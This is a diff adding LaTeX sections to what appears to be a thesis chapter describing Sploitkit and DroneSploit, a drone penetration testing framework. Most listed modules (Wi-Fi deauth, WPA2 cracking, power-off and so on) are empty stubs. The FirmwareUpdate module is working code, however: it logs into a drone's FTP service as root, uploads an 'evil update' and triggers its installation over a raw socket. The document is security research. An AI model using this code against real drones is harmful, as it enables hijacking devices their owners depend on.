@@ -3,5 +3,104 @@
 {\large \hyphenation{} \bigletter{D}{roneSploit}, the framework we propose to build, is an attempt to mechanize drone hacking techniques in particular in a user-friendly way, exactly like Metasploit does for network penetration testing in general. \newline\\}}%
 {framework}
 
+\section{Sploitkit}
+
+This section succinctly presents Sploitkit, a \textit{toolkit for building Metasploit-like consoles}. \cite{sploitkit}
+
+\subsection{Philosophy}
+
+This framework is built to facilitate the creation of new penetration testing consoles tailored to specific use cases.
+
+\subsection{\acrlong{api}}
+
+Sploitkit aims to provide an easy and convenient \acrshort{api} for quickly extending the console with new commands, modules and store models in an object oriented manner.
+
+
+\section{Dronesploit}
+
+This section presents Dronesploit, a \textit{drone penetration testing framework} \cite{dronesploit}, built to automate the exploits whose working is presented in Chapter \ref{exploits}.
+
+\subsection{Core}
+
+
+\subsection{Modules}
+
+
+\begin{center}
+\begin{lstlisting}
+class FindTargets(Module):
+	path = "scanning/wifi"
+	
+	def run(self):
+		pass
+
+
+class Deauth(Module):
+	path = "auxiliary/wifi"
+
+
+class MonitorMode(Module):
+    path = "auxiliary/wifi"
+
+
+class Wpa2pskCrack(Module):
+    path = "auxiliary/wifi"
+
+
+class ChangeDatetime(Module):
+    path = "exploits/cme"
+
+
+class ChangeSsid(Module):
+    path = "exploits/cme"
+
+
+class ChangePassword(Module):
+    path = "exploits/cme"
+
+
+class PowerOff(Module):
+    path = "exploits/cme"
+
+
+class GetSysParam(Module):
+    path = "exploits/cme"
+
+
+class StopVideo(Module):
+    path = "exploits/cme"
+
+
+import socket
+import time
+from ftplib import FTP
+
+class FirmwareUpdate(Module):
+    path = "exploits/cme"
+    def run(self):
+    	self.logger.info("Starting an FTP session...")
+        ftp = FTP('192.168.100.1', 2121)
+    	self.logger.debug("Authenticating...")
+        ftp.sendcmd("USER root")
+        ftp.sendcmd("PASS *")
+        ftp.sendcmd("SYST")
+        ftp.sendcmd("PWD")
+        ftp.sendcmd("TYPE I")
+        ftp.sendcmd("CWD /")
+        ftp.sendcmd("PASV")
+    	self.logger.info("Pushing an evil update...")
+        with open("0.7.15.zip", 'rb') as f:
+	        ftp.storbinary("STOR 0.7.15.zip", f)
+        ftp.quit()
+    	self.logger.info("Triggering update...")
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(("192.168.100.1", 4646))
+        s.send(b'{"CMD" : 71,"PARAM" : "0.7.15"}')
+        time.sleep(3)
+        self.logger.success("Target updated !")
+\end{lstlisting}
+\end{center}
+
+
 
 \end{chaptercover}
